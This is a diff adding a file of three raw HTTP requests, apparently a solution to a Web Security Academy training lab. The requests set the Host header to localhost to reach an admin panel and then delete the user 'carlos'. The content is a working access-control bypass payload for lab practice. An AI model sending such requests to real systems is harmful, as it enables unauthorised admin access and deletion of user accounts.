@@ -1,0 +1,8 @@
+GET /admin HTTP/1.1
+Host: ac3b1f261fa3541bc0453521003300eb.web-security-academy.net
+
+GET /admin HTTP/1.1
+Host: localhost
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
